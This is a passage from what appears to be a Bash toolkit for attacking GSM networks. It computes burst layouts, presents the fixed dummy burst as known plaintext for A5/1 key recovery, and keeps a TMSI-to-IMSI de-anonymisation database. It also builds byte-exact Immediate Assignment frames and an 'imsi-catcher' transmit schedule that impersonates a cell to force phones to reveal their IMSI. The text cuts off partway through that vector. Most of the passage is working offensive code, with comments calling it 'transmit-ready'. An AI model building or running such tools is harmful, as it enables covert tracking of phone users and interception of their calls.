training	42..105	64	extended training sequence
data	106..144	39	encrypted e39..e77
tail	145..147	3	(0,0,0)
guard	148..156	8.25	normal guard
EOF
            ;;
        access) cat <<'EOF'
burst	access	AB
field	bits	length	note
extended_tail	0..7	8	(0,0,1,1,1,0,1,0)
sync	8..48	41	synchronisation sequence (41 bits)
data	49..84	36	encrypted e0..e35 (RACH: 8-bit reference + cause)
tail	85..87	3	(0,0,0)
guard	88..156	68.25	extended guard: the MS does not know its timing advance
EOF
            ;;
        frequency) cat <<'EOF'
burst	frequency	FB
field	bits	length	note
tail	0..2	3	(0,0,0)
fixed	3..144	142	all zero -> unmodulated carrier at +1625/24 kHz
tail	145..147	3	(0,0,0)
guard	148..156	8.25	normal guard
EOF
            ;;
        dummy) cat <<'EOF'
burst	dummy	DB
field	bits	length	note
tail	0..2	3	(0,0,0)
mixed	3..144	142	fixed pattern, NOT encrypted
tail	145..147	3	(0,0,0)
guard	148..156	8.25	normal guard
note	The 142 mixed bits split as: e0..e56 (bits 3..59), stealing flag 0 at
note	BN60, the 26-bit C0 filling training sequence at BN61..86, stealing
note	flag 1 at BN87, then e57..e113 (bits 88..144).
note	Because the pattern is fixed, every idle C0 burst hands an attacker 142
note	known plaintext bits. TS 45.002 annex A.2 permits variants, so confirm
note	the one in use before trusting the known bits.
known_plain_bits	142
data_bits	114
EOF
            ;;
        *) printf 'ERROR\tburst must be normal, sync, access, frequency or dummy (got %s)\n' "$kind" >&2; return 2 ;;
    esac
}

# The 41-bit access-burst synchronisation sequence is fixed by the spec, so a
# RACH transmitter replays it verbatim rather than deriving it.
GATK_AB_SYNC_BITS='0100101101111111100110011010101011000111100'

# The dummy burst (TS 45.002 5.2.6) is what a BTS puts in every idle timeslot
# of C0 so the downlink is never silent (TS 45.002 6.5.1(i)). Its 142 mixed
# bits are a FIXED constant, which makes it the only standardised known
# plaintext on the air interface - and therefore the cheapest Kc-recovery
# target there is, because 142 bits of known plaintext per burst is far more
# than the ~64 bits A5/1 needs.
#
# The 142 bits span BN3..BN144, and the boundary between them matters if the
# burst is to be assembled: BN3..BN59 are e0..e56, BN60 is the stealing flag
# hl, BN61..BN86 is the 26-bit C0 filling sequence, BN87 is hu, and BN88..BN144
# are e57..e113. So the constant carries 114 "encrypted" bits plus the two
# flags and the training sequence - all of it known.
#
# CAVEAT, and it is not a small one: TS 45.002 annex A.2 explicitly permits
# several variants - the C0 filling training sequence, a normal-burst training
# sequence, and either value for the stealing flag. So this constant is the
# baseline, not a guarantee. Verify the variant the target cell actually sends
# before treating the recovered keystream as known. The string itself is a
# single-source transcription of table 5.2.6; re-read the PDF before relying
# on it bit-exactly.
GATK_DB_MIXED_BITS='1111101101110110000010100100111000001001000100000001111100011100010111000101110001010111010010100011001100111001111010011111000100101111101010'


# Emit the dummy burst as usable known plaintext rather than a blob: the two
# data halves, the flags and the filling sequence separately, because a
# chosen-plaintext attack needs the bit POSITIONS, not just the values.
gatk_dummy_burst() {
    local bits="$GATK_DB_MIXED_BITS"
    printf 'burst\tdummy\tDB\n'
    printf 'mixed_bits\t%s\n' "$bits"
    printf 'mixed_bits_len\t%d\n' "${#bits}"
    printf 'bn_range\t3..144\n'
    printf 'e0_56\t%s\n' "${bits:0:57}"
    printf 'hl_flag_bn60\t%s\n' "${bits:57:1}"
    printf 'c0_filling_bn61_86\t%s\n' "${bits:58:26}"
    printf 'hu_flag_bn87\t%s\n' "${bits:84:1}"
    printf 'e57_113\t%s\n' "${bits:85:57}"
    printf 'encrypted_bits\t114\n'
    printf 'known_plain_bits\t142\n'
    printf 'source\tTS 45.002 5.2.6\n'
    printf 'note\tA BTS must fill every idle timeslot of C0 with a burst (TS 45.002\n'
    printf 'note\t6.5.1(i)), and this is the one it fills them with, so the plaintext\n'
    printf 'note\tis there without the attacker provoking anything. 142 known bits per\n'
    printf 'note\tburst is more than the 228 bits two A5/1 frames yield, and it repeats\n'
    printf 'note\tfor as long as the timeslot stays idle - which makes it the cheapest\n'
    printf 'note\tknown plaintext on the air interface, and the reason a Kc search does\n'
    printf 'note\tnot need a call to be in progress at all.\n'
    printf 'note\tTS 45.002 annex A.2 permits variants (filling sequence, flag values);\n'
    printf 'note\tconfirm which one the target cell sends before trusting the bits.\n'
}

gatk_fcch_facts() {
    awk 'BEGIN{
        printf "fixed_bits\t142\n"
        printf "fixed_bit_value\t0\n"
        printf "frequency_offset_khz\t%.6f\n", 1625.0 / 24.0
        printf "guard_bits\t8.25\n"
        printf "slot_bits\t156.25\n"
    }'
}

# ══════════════════════════════════════════════════════════════════════
# LAPDm framing (TS 44.006)
#
# Every RR and MM message the vectors forge rides on LAPDm, so the layer-2
# header has to be right before the bytes mean anything. Three octets:
#
#   address   bit 8 spare | bits 7-6 LPD | bits 5-3 SAPI | bit 2 C/R | bit 1 EA
#   control   U format: bits 7-6, 4-3 = unnumbered function, bit 5 P/F, bit 1-2 = 1
#   length    bits 8-3 L (6 bits) | bit 2 M (more data) | bit 1 EL
#
# EA = 1 and EL = 1 because both fields are one octet here. LPD = 00 is the
# TS 44.006 discriminator (01 would be the SMSCB channel). The UI command is
# the unacknowledged workhorse: control 0x03 with P = 0, which is exactly the
# "fill frame" 03 03 01 the spec defines for an empty SAPI 0 message.
# ══════════════════════════════════════════════════════════════════════

# N201 ceilings, TS 44.006 section 8.8.3. A frame longer than the channel's
# N201 has to be segmented with the M bit, not truncated.
# TS 44.006 8.8.3. N201 is the largest information field a channel carries,
# and it is what makes an over-long L3 message a protocol error rather than
# just a big frame. Format A/B is the original; format Bter is the later,
# larger one. Both are in the field, so the value depends on the MS's phase.
gatk_n201() {   # <sacch|facch|sdcch|bcch|agch|pch|nch> [bter]
    local ch="${1:-sdcch}" fmt="${2:-}" n=0
    case "$ch" in
        sacch)  [[ "$fmt" == bter ]] && n=21 || n=18 ;;
        facch|sdcch) [[ "$fmt" == bter ]] && n=23 || n=20 ;;
        bcch|agch|pch|nch) n=23 ;;
        *) printf 'ERROR\tunknown channel %s (sacch facch sdcch bcch agch pch nch)\n' "$ch" >&2; return 2 ;;
    esac
    printf 'channel\t%s\n' "$ch"
    printf 'format\t%s\n' "$([[ "$fmt" == bter ]] && echo Bter || echo 'A/B')"
    printf 'n201\t%d\n' "$n"
    printf 'source\tTS 44.006 8.8.3\n'
}

gatk_lapdm_ui() {   # <sapi 0|3> <cr 0|1> <l3-hex> [p 0|1] [n201 0..63]
    local sapi="${1:-0}" cr="${2:-1}" l3 p="${4:-0}" n201="${5:-23}"
    l3=$(gatk_norm_hex "${3:-}")
    [[ "$sapi" =~ ^[0-9]+$ ]] && (( sapi <= 7 )) || {
        printf 'ERROR\tSAPI must be 0..7 (got %s)\n' "$sapi" >&2; return 2; }
    [[ "$cr" =~ ^[01]$ ]] || {
        printf 'ERROR\tC/R must be 0 (MS->BS command) or 1 (BS->MS command)\n' >&2; return 2; }
    [[ "$p" =~ ^[01]$ ]] || { printf 'ERROR\tP bit must be 0 or 1\n' >&2; return 2; }
    gatk_is_hex "$l3" || { printf 'ERROR\tlayer 3 payload must be hex\n' >&2; return 2; }
    (( ${#l3} % 2 == 0 )) || { printf 'ERROR\tlayer 3 payload must be whole octets\n' >&2; return 2; }
    local n=$(( ${#l3} / 2 ))
    [[ "$n201" =~ ^[0-9]+$ ]] || n201=23
    (( n <= n201 )) || {
        printf 'ERROR\tpayload is %s octets; N201 is %s on this channel (TS 44.006 8.8.3)\n' \
            "$n" "$n201" >&2; return 2; }
    (( n <= n201 )) || {
        printf 'ERROR\tpayload is %s octets and N201 for this channel is %s; segment it with the M bit\n' \
            "$n" "$n201" >&2; return 2; }
    local addr=$(( (0 << 6) | (sapi << 3) | (cr << 1) | 1 ))
    local ctrl=$(( 0x03 | (p << 4) ))
    local len=$(( (n << 3) | (0 << 1) | 1 ))
    printf 'address\t%02x\n' "$addr"
    printf 'control\t%02x\n' "$ctrl"
    printf 'length\t%02x\n' "$len"
    printf 'payload_octets\t%d\n' "$n"
    printf 'frame_octets\t%d\n' "$(( n + 3 ))"
    printf 'frame\t%02x%02x%02x%s\n' "$addr" "$ctrl" "$len" "$l3"
    printf 'n201\t%s\n' "$n201"
}

# The LAPDm block fills four normal bursts. For SDCCH each burst carries 114
# traffic bits plus 2 stealing flags, and 4 x 114 = 456 is exactly the coded
# size of one LAPDm frame after the FIRE and convolutional codes. The channel
# coding itself is TS 45.003, so what this produces is the burst schedule the
# coder feeds: four frame numbers and the slice each one carries.
gatk_lapdm_fill_frame() { printf '030301\n'; }

gatk_lapdm_burst_plan() {   # <frame-hex> <fn0> <fn1> <fn2> <fn3>
    local hex fn0 fn1 fn2 fn3
    hex=$(gatk_norm_hex "${1:-}"); fn0="${2:-}"; fn1="${3:-}"; fn2="${4:-}"; fn3="${5:-}"
    gatk_is_hex "$hex" || { printf 'ERROR\tLAPDm frame must be hex\n' >&2; return 2; }
    (( ${#hex} % 2 == 0 )) || { printf 'ERROR\tLAPDm frame must be whole octets\n' >&2; return 2; }
    local fn
    for fn in "$fn0" "$fn1" "$fn2" "$fn3"; do
        [[ "$fn" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\tall four burst frame numbers must be non-negative integers\n' >&2
            return 2; }
    done
    local octets=$(( ${#hex} / 2 ))
    printf 'lapdm_frame\t%s\n' "$hex"
    printf 'lapdm_octets\t%d\n' "$octets"
    printf 'lapdm_bits\t%d\n' "$(( octets * 8 ))"
    printf 'coded_bits\t456\n'
    printf 'bursts\t4\n'
    printf 'bits_per_burst\t114\n'
    printf 'stealing_flags_per_burst\t2\n'
    printf 'burst\tframe_number\tbit_range\n'
    printf '0\t%s\t0..113\n'   "$fn0"
    printf '1\t%s\t114..227\n' "$fn1"
    printf '2\t%s\t228..341\n' "$fn2"
    printf '3\t%s\t342..455\n' "$fn3"
    printf 'note\tbits are the 456-bit output of the TS 45.003 FIRE + convolutional block\n'
}

# ══════════════════════════════════════════════════════════════════════
# TMSI <-> IMSI correlation store
#
# A de-anonymisation is only worth anything if the mapping survives the
# observation that produced it, so it is persisted rather than printed. Each
# row is one TMSI with the IMSI behind it, the LAC it was seen on, how it was
# obtained, and an observation count. Recording the same pair twice bumps the
# count instead of duplicating the row, which is what makes a repeat sighting
# visible as corroboration.
# ══════════════════════════════════════════════════════════════════════

GATK_DEANON_DB="$GATK_DIR/deanon.tsv"

gatk_deanon_field_check() {   # <tmsi> <imsi> <lac>
    local tmsi="$1" imsi="$2" lac="$3"
    [[ "$tmsi" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\tTMSI must be 8 hex digits (got %s)\n' "$tmsi" >&2; return 2; }
    [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || {
        printf 'ERROR\tIMSI must be 6 to 15 digits (got %s)\n' "$imsi" >&2; return 2; }
    [[ -z "$lac" || "$lac" =~ ^[0-9a-f]{4}$ ]] || {
        printf 'ERROR\tLAC must be 4 hex digits (got %s)\n' "$lac" >&2; return 2; }
    return 0
}

gatk_deanon_record() {   # <tmsi-hex8> <imsi> [lac-hex4] [method] [fn]
    local tmsi imsi lac method fn
    tmsi=$(gatk_norm_hex "${1:-}"); imsi="${2:-}"
    lac=$(gatk_norm_hex "${3:-}"); method="${4:-identity-request}"; fn="${5:-0}"
    gatk_deanon_field_check "$tmsi" "$imsi" "$lac" || return $?
    [[ "$fn" =~ ^[0-9]+$ ]] || fn=0
    local tmp; tmp=$(mktemp "$GATK_DIR/deanon.XXXXXX") || return 1
    local found=0
    if [[ -f "$GATK_DEANON_DB" ]]; then
        awk -F'\t' -v t="$tmsi" -v i="$imsi" -v l="$lac" -v m="$method" -v f="$fn" '
            BEGIN{ OFS="\t"; found=0 }
            $1==t && $2==i {
                printf "%s\t%s\t%s\t%s\t%s\t%s\t%d\t%s\n", $1,$2,$3,$4,$5,$6,$7+1,$8
                found=1; next
            }
            { print }
            END{ if (!found) printf "%s\t%s\t%s\t%s\t%s\t%s\t1\tunconfirmed\n", t,i,(l==""?"----":l),m,f,f }
        ' "$GATK_DEANON_DB" > "$tmp"
    else
        printf '%s\t%s\t%s\t%s\t%s\t%s\t1\tunconfirmed\n' \
            "$tmsi" "$imsi" "${lac:-----}" "$method" "$fn" "$fn" > "$tmp"
    fi
    mv "$tmp" "$GATK_DEANON_DB" || { rm -f "$tmp"; return 1; }
    printf 'recorded\ttmsi=%s imsi=%s\n' "$tmsi" "$imsi"
    printf 'database\t%s\n' "$GATK_DEANON_DB"
}

gatk_deanon_lookup() {   # <tmsi-hex8>
    local tmsi; tmsi=$(gatk_norm_hex "${1:-}")
    [[ "$tmsi" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\tTMSI must be 8 hex digits (got %s)\n' "$tmsi" >&2; return 2; }
    [[ -f "$GATK_DEANON_DB" ]] || {
        printf 'result\tmiss\n'
        printf 'note\tno correlations recorded yet in %s\n' "$GATK_DEANON_DB"
        return 1; }
    awk -F'\t' -v t="$tmsi" '
        $1==t { printf "tmsi\t%s\nimsi\t%s\nlac\t%s\nmethod\t%s\nfirst_fn\t%s\nlast_fn\t%s\nobservations\t%s\nstate\t%s\n", $1,$2,$3,$4,$5,$6,$7,$8; hit=1 }
        END{ if (!hit) { printf "result\tmiss\n"; exit 1 } }
    ' "$GATK_DEANON_DB"
}

gatk_deanon_list() {
    if [[ ! -s "$GATK_DEANON_DB" ]]; then
        printf 'count\t0\n'
        return 0
    fi
    printf 'tmsi\timsi\tlac\tmethod\tobservations\tstate\n'
    awk -F'\t' 'NF>=8 { printf "%s\t%s\t%s\t%s\t%s\t%s\n", $1,$2,$3,$4,$7,$8 }' "$GATK_DEANON_DB"
    printf 'count\t%s\n' "$(awk 'NF>=8{n++} END{print n+0}' "$GATK_DEANON_DB")"
}

# A correlation is corroborated when the IMSI's own paging group lands on the
# block the PAGING REQUEST was actually observed in. That check needs no
# transmission at all, so a match is strong evidence and a mismatch means the
# pairing is wrong rather than merely unproven.
gatk_deanon_confirm() {   # <tmsi-hex8> <imsi> <observed-block 0..8> <bs-pa-mfrms> <pblocks> [bs-ag-blks-res]
    local tmsi imsi block pam pblocks res
    tmsi=$(gatk_norm_hex "${1:-}"); imsi="${2:-}"; block="${3:-}"
    pam="${4:-2}"; pblocks="${5:-}"; res="${6:-0}"
    gatk_deanon_field_check "$tmsi" "$imsi" "" || return $?
    [[ "$block" =~ ^[0-9]$ ]] && (( block < GATK_CCCH_BLOCKS )) || {
        printf 'ERROR\tobserved CCCH block must be 0..%s\n' "$(( GATK_CCCH_BLOCKS - 1 ))" >&2; return 2; }
    local grp pg
    grp=$(gatk_paging_schedule "$imsi" "$pam" "$res" "$pblocks") || return $?
    pg=$(printf '%s\n' "$grp" | awk -F'\t' '$1=="ccch_block"{print $2}')
    printf 'imsi_paging_block\t%s\n' "$pg"
    printf 'observed_block\t%s\n' "$block"
    if [[ "$pg" == "$block" ]]; then
        printf 'verdict\tconfirmed\n'
        printf 'note\tthe IMSI predicts the block the TMSI was paged in\n'
    else
        printf 'verdict\tcontradicted\n'
        printf 'note\tthe IMSI predicts block %s but the page was seen in block %s\n' "$pg" "$block"
    fi
}

# ══════════════════════════════════════════════════════════════════════
# TRANSMIT VECTORS
#
# These are the four operations the module used to only describe. Each one
# now resolves to a frame-accurate transmission schedule: an absolute TDMA
# frame number for every burst, the channel it lands on, and the exact octets
# it carries. What is left is the radio — a full-duplex SDR that can transmit
# on the target ARFCN while receiving on it.
#
# The honesty line each vector reports is `status`:
#   transmit-ready  every octet and every frame number is computed and
#                   checked; the schedule is what a driver would walk
#   handoff         something on the path is not derivable in software
#
# The one thing no amount of arithmetic substitutes for is that these have
# never been keyed. `written` is not `works` — see docs/HANDOFF.md.
# ══════════════════════════════════════════════════════════════════════

# <mf> <offset> <channel> <direction> <burst> <octets> <note>
gatk_sched_row() {   # <mf> <offset> <channel> <direction> <burst> <octets> <note>
    printf '%d\t%d\t%d\t%s\t%s\t%s\t%s\t%s\n' \
        "$(( ${1:-0} * 51 + ${2:-0} ))" "${1:-0}" "${2:-0}" \
        "${3:-}" "${4:-}" "${5:-}" "${6:-}" "${7:-}"
}

gatk_sched_header() { printf 'fn\tmf\toffset\tchannel\tdirection\tburst\toctets\tnote\n'; }

gatk_vector_needs() {
    local tx rx stack
    tx=$(gatk_find_tx_sdr 2>/dev/null | head -1)
    rx=$(gatk_find_rx_sdr 2>/dev/null | head -1)
    stack=$(gatk_find_gsm_stack 2>/dev/null | head -1)
    printf 'tx_sdr\t%s\n' "${tx:-none}"
    printf 'rx_sdr\t%s\n' "${rx:-none}"
    printf 'gsm_stack\t%s\n' "${stack:-none}"
    printf 'minimum\tfull-duplex SDR spanning the GSM downlink and uplink (e.g. PlutoSDR, USRP B210); one radio cannot transmit and receive the same ARFCN at once\n'
}

# ── 1. GSM IMSI catcher (O1) ───────────────────────────────────────────
# The full clone: present a BCCH strong enough that the target camps on it,
# answer the RACH with an Immediate Assignment, and ask for the IMSI over the
# SDCCH the assignment opened. Everything here except the transmission is
# arithmetic that TS 44.018 and TS 45.002 fix exactly.
# ── AGCH: IMMEDIATE ASSIGNMENT (real, byte-exact) ───────────────────────
# TS 44.018 section 9.1.18, table 9.1.18.1. The message is a V-format
# sequence, which is why the IEI column is empty for every field in that
# table: none of them carries an identity octet, they are identified by
# position. The three-octet Channel Description and Request Reference are the
# four-octet type 3 IEs of 10.5.2.5 and 10.5.2.30 with the IEI octet dropped,
# and Timing Advance is the two-octet 10.5.2.40 IE likewise. The first octet
# is the L2 pseudo length, which per 10.5.2.19 counts the octets that follow
# it in T/V/TV/LV/TLV format, EXCLUDING the IA Rest Octets.
gatk_build_immediate_assignment() {
    # [ra-hex2] [fn] [ta] [sdcch4|sdcch8] [subchannel] [arfcn] [tsc] [tn]
    #   [page-mode 0..3] [ia-rest-hex]
    local ra; ra=$(gatk_norm_hex "${1:-0c}")
    local fn="${2:-0}" ta="${3:-0}" chan="${4:-sdcch4}" sub="${5:-0}"
    local arfcn="${6:-62}" tsc="${7:-7}" tn="${8:-0}"
    # The default IA Rest Octets is a single 0x2b: the two leading
    # discriminator bits are LL and the rest is the standard no-addition
    # filler. 0x80 LOOKS like the obvious "L then H" but reads as HL, which
    # announces a 6-bit "Length of frequency parameters" followed by a
    # Frequency Parameters block, so one octet truncates the IE and a decoder
    # rejects the message as malformed. Verified against Wireshark.
    local pm="${9:-0}" iarest; iarest=$(gatk_norm_hex "${10:-2b}")
    local dmotbf="${11:-0}"

    [[ "$ra" =~ ^[0-9a-f]{2}$ ]] || {
        printf 'ERROR\tRA must be one octet of hex (got %s)\n' "${1:-}" >&2; return 2; }
    [[ "$iarest" =~ ^([0-9a-f]{2})+$ ]] || {
        printf 'ERROR\tIA Rest Octets must be whole octets of hex (got %s)\n' "${10:-}" >&2; return 2; }
    local n
    for n in "$fn" "$ta" "$arfcn" "$tsc" "$tn" "$pm" "$dmotbf"; do
        [[ "$n" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\tnumeric argument expected, got %s\n' "$n" >&2; return 2; }
    done
    (( fn <= GATK_MAX_FN )) || {
        printf 'ERROR\tframe number must be 0..%s (got %s)\n' "$GATK_MAX_FN" "$fn" >&2; return 2; }
    (( ta <= 63 )) || { printf 'ERROR\ttiming advance must be 0..63 (got %s)\n' "$ta" >&2; return 2; }
    (( arfcn <= 1023 )) || { printf 'ERROR\tARFCN must be 0..1023 (got %s)\n' "$arfcn" >&2; return 2; }
    (( tsc <= 7 )) || { printf 'ERROR\tTSC must be 0..7 (got %s)\n' "$tsc" >&2; return 2; }
    (( tn <= 7 )) || { printf 'ERROR\ttimeslot must be 0..7 (got %s)\n' "$tn" >&2; return 2; }
    (( pm <= 3 )) || { printf 'ERROR\tpage mode must be 0..3 (got %s)\n' "$pm" >&2; return 2; }
    (( dmotbf <= 15 )) || { printf 'ERROR\tDedicated mode or TBF must be 0..15 (got %s)\n' "$dmotbf" >&2; return 2; }

    # Channel type and TDMA offset, table 10.5.2.5.1, bits 8..4 of octet 2.
    # The T bits carry the subchannel, so SDCCH/4 is 0 0 1 T T and SDCCH/8 is
    # 0 1 T T T. Both entries say "TSC Set 1 shall be used", which is why the
    # TSC comes from the training sequence field below and not from here.
    local ctype
    case "$chan" in
        sdcch4) (( sub <= 3 )) || { printf 'ERROR\tSDCCH/4 subchannel must be 0..3 (got %s)\n' "$sub" >&2; return 2; }
                ctype=$(( 4 + sub )) ;;
        sdcch8) (( sub <= 7 )) || { printf 'ERROR\tSDCCH/8 subchannel must be 0..7 (got %s)\n' "$sub" >&2; return 2; }
                ctype=$(( 8 + sub )) ;;
        *) printf 'ERROR\tchannel must be sdcch4 or sdcch8 (got %s)\n' "$chan" >&2; return 2 ;;
    esac

    # Channel Description, 10.5.2.5, H = 0. Octet 2 is channel type and TN.
    # Octet 3 is TSC at bits 8..6, H at bit 5, bits 4..3 spare, and the TWO
    # HIGH BITS OF THE ARFCN at bits 2..1 - not the low ones, which is the
    # misreading this field invites. Octet 4 is the low eight ARFCN bits.
    local cd2=$(( (ctype << 3) | tn ))
    local cd3=$(( (tsc << 5) | ((arfcn >> 8) & 3) ))
    local cd4=$(( arfcn & 255 ))

    # Request Reference, 10.5.2.30. T1' = (FN div 1326) mod 32 sits at octet 3
    # bits 8..4; T3 = FN mod 51 has its MSB at octet 3 bit 3 and its LSB at
    # octet 4 bit 6; T2 = FN mod 26 sits at octet 4 bits 5..1. The spec's own
    # inverse is FN mod 42432 = 51*((T3-T2) mod 26) + T3 + 51*26*T1'.
    local t1p=$(( (fn / 1326) % 32 )) t3=$(( fn % 51 )) t2=$(( fn % 26 ))
    local rr1=$(( 16#$ra ))
    local rr2=$(( (t1p << 3) | (t3 >> 3) ))
    local rr3=$(( ((t3 & 7) << 5) | t2 ))
    local fn_rec=$(( 51 * ((t3 - t2 + 26) % 26) + t3 + 51 * 26 * t1p ))

    # Page Mode (10.5.2.26) and Dedicated mode or TBF (10.5.2.25b) share one
    # octet, half each. Nibble 0000 in the TBF half is table 10.5.2.25b.2's
    # "this message assigns a dedicated mode resource".
    local oct4=$(( (pm << 4) | dmotbf ))

    # Mobile Allocation, 9.1.18.1: when the assignment is for a dedicated
    # resource and the Channel Description does not indicate frequency
    # hopping, the length indicator is ZERO, so the whole IE is one 0x00
    # octet and the MS is told to treat it as unnecessary.
    local mo=0

    # TWELVE %02x conversions and one %s. Passing a thirteenth conversion
    # without a matching argument makes printf REPEAT the format and emit a
    # whole extra phantom message - the first run of this function printed 23
    # octets instead of 13 and looked plausible.
    # The first octet is the L2 pseudo length, and octet 2 carries the
    # protocol discriminator in its LOW nibble and the skip indicator in its
    # HIGH nibble: TS 44.018 10.3.1 says "bits 5 to 8 of the first octet of
    # every Radio Resource management message ... contain the skip indicator",
    # so the PD (0110 for RR) is bits 4..1 and the octet is 0x06, not 0x60.
    # Transposing them makes a decoder read PD 11 (non-call-related SS) and
    # the whole message is then parsed as DTAP - silently, with no error.
    #
    # L2 pseudo length = 11, per TS 44.018 9.1.18: "the sum of lengths of all
    # information elements present in the message except the IA Rest Octets
    # and L2 Pseudo Length information elements". Table 9.1.18.1 gives
    # Protocol Discriminator + Skip Indicator 1, Message Type 1, Page Mode
    # and Dedicated mode or TBF 1 (they share an octet), Channel Description
    # 3, Request Reference 3, Timing Advance 1, Mobile Allocation 1.
    local l2pl=11
    local l3
    l3=$(printf '%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%s' \
        "$(( l2pl & 255 ))" "$(( 0x06 & 255 ))" "$(( 0x3f & 255 ))" \
        "$(( oct4 & 255 ))" "$(( cd2 & 255 ))" "$(( cd3 & 255 ))" "$(( cd4 & 255 ))" \
        "$(( rr1 & 255 ))" "$(( rr2 & 255 ))" "$(( rr3 & 255 ))" \
        "$(( ta & 255 ))" "$(( mo & 255 ))" "$iarest")

    local pmname
    case "$pm" in
        0) pmname="normal paging" ;; 1) pmname="extended paging" ;;
        2) pmname="paging reorganization" ;; *) pmname="same as before" ;;
    esac
    local dmname
    case "$dmotbf" in
        0) dmname="assigns a dedicated mode resource" ;;
        *) dmname="TBF or no-resource coding (table 10.5.2.25b.2)" ;;
    esac

    printf 'message\tIMMEDIATE_ASSIGNMENT\n'
    printf 'l2_pseudo_length\t%d\n' "$l2pl"
    printf 'l2_pseudo_source\tTS 44.018 9.1.18: sum of all IEs except IA Rest Octets and L2 Pseudo Length\n'
    printf 'message_type\t3f\n'
    printf 'page_mode\t%d\n' "$pm"
    printf 'page_mode_name\t%s\n' "$pmname"
    printf 'dedicated_mode_or_tbf\t%d\n' "$dmotbf"
    printf 'dedicated_mode_or_tbf_name\t%s\n' "$dmname"
    printf 'channel_description_octets\t3\n'
    printf 'channel_description\t%02x%02x%02x\n' "$(( cd2 & 255 ))" "$(( cd3 & 255 ))" "$(( cd4 & 255 ))"
    printf 'channel_type\t%s\n' "$chan"
    printf 'channel_type_field\t%d\n' "$ctype"
    printf 'subchannel\t%d\n' "$sub"
    printf 'timeslot\t%d\n' "$tn"
    printf 'tsc\t%d\n' "$tsc"
    printf 'arfcn\t%d\n' "$arfcn"
    printf 'hopping\tno\n'
    printf 'request_reference_octets\t3\n'
    printf 'request_reference\t%02x%02x%02x\n' "$(( rr1 & 255 ))" "$(( rr2 & 255 ))" "$(( rr3 & 255 ))"
    printf 'ra\t%02x\n' "$(( rr1 & 255 ))"
    printf 'fn\t%d\n' "$fn"
    printf 't1p\t%d\n' "$t1p"
    printf 't3\t%d\n' "$t3"
    printf 't2\t%d\n' "$t2"
    printf 'fn_mod_42432\t%d\n' "$(( fn % 42432 ))"
    printf 'fn_recovered\t%d\n' "$fn_rec"
    printf 'timing_advance\t%02x\n' "$(( ta & 255 ))"
    printf 'timing_advance_value\t%d\n' "$ta"
    printf 'mobile_allocation\t%02x\n' "$(( mo & 255 ))"
    printf 'mobile_allocation_note\tlength indicator 0: non-hopping, MS treats the IE as unnecessary (TS 44.018 9.1.18.1)\n'
    printf 'ia_rest_octets\t%s\n' "$iarest"
    printf 'l3_octets\t%d\n' "$(( 12 + ${#iarest} / 2 ))"
    printf 'l3\t%s\n' "$l3"
    gatk_lapdm_ui 0 1 "$l3" 0 23 2>/dev/null | awk -F'\t' '$1=="frame"{printf "lapdm_frame\t%s\n", $2}'
    return 0
}

gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-imsi] [pam] [res] [ccch-conf] [start-fn]
    local mcc="${1:-262}" mnc="${2:-01}" lac ci arfcn bsic target
    lac=$(gatk_norm_hex "${3:-00f1}"); ci=$(gatk_norm_hex "${4:-00a1}")
    arfcn="${5:-62}"; bsic="${6:-7}"
    target="${7:-310150123456789}"
    local pam="${8:-2}" res="${9:-1}" conf="${10:-001}" startfn="${11:-0}"
    [[ "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tARFCN must be a number\n' >&2; return 2; }
    [[ "$bsic" =~ ^[0-9]+$ ]] && (( bsic <= 63 )) || {
        printf 'ERROR\tBSIC must be 0..63 (got %s)\n' "$bsic" >&2; return 2; }
    [[ "$lac" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\tLAC must be 4 hex digits\n' >&2; return 2; }
    [[ "$ci"  =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\tCI must be 4 hex digits\n' >&2; return 2; }
    local confline; confline=$(gatk_ccch_conf "$conf") || return $?
    local comb maxb
    comb=$(printf '%s\n' "$confline" | awk -F'\t' '$1=="bs_ccch_sdcch_comb"{print $2}')
    maxb=$(printf '%s\n' "$confline" | awk -F'\t' '$1=="paging_blocks_max"{print $2}')
    local nblocks; nblocks=$(gatk_ccch_blocks_available "$comb")

    # The identity we make the target believe it is camping on.
    local lai; lai=$(gatk_lai_encode "$mcc" "$mnc" "$lac")
    local ir; ir=$(gatk_build_identity_request 1 | awk -F'\t' '$1=="octets"{print $2}')
    local schbits; schbits=$(gatk_sch_payload "$bsic" 1 | awk -F'\t' '$1=="sch_bits"{print $2}')
    local lapdm; lapdm=$(gatk_lapdm_ui 0 1 "$ir")

    printf 'vector\timsi-catcher\n'
    printf 'objective\tforce a camped MS to send its IMSI in the clear over a forged SDCCH\n'
    printf 'status\ttransmit-ready\n'
    printf 'gated\tthe schedule below is computed, not keyed: a driver must present the --tx-ack acknowledgement before any radio is driven, and this captures a subscriber identity\n'
    gatk_vector_needs
    printf '\n'
    printf '# the cell we impersonate\n'
    printf 'arfcn\t%s\n' "$arfcn"
    printf 'bsic\t%s\n' "$bsic"
    printf 'plmn_colour_code\t%s\n' "$(( bsic / 8 ))"
    printf 'bs_colour_code\t%s\n' "$(( bsic % 8 ))"
    printf 'mcc\t%s\nmnc\t%s\nlac\t%s\nci\t%s\n' "$mcc" "$mnc" "$lac" "$ci"
    printf 'lai_octets\t%s\n' "$lai"
    printf 'ccch_conf\t%s\n' "$conf"
    printf 'bs_ccch_sdcch_comb\t%s\n' "$comb"
    printf 'ccch_blocks\t%s\n' "$nblocks"
    printf 'bs_ag_blks_res\t%s\n' "$res"
    printf 'bs_pa_mfrms\t%s\n' "$pam"
    printf 'target_imsi\t%s\n' "$target"
    printf '\n'
    printf '# SCH: the 25 information bits in every synchronisation burst,\n'
    printf '# so the MS can lock to our frame clock. T1/T2/T3p, BSIC on top.\n'
    printf 'sch_bits\t%s\n' "$schbits"
    printf 'sch_period\t11 frames (T3 = 1, 11, 21, 31, 41)\n'
    printf '\n'
    printf '# message sequence\n'
    printf 'step\t1\tBCCH\tclone broadcast: SI1, SI2, SI3, SI4 with our LAI and a C1 that wins reselection\n'
    printf 'step\t2\tRACH\tMS sends an access burst with a random reference; we receive it\n'
    printf 'step\t3\tAGCH\tImmediate Assignment naming an SDCCH/4 sub-channel and a Timing Advance\n'
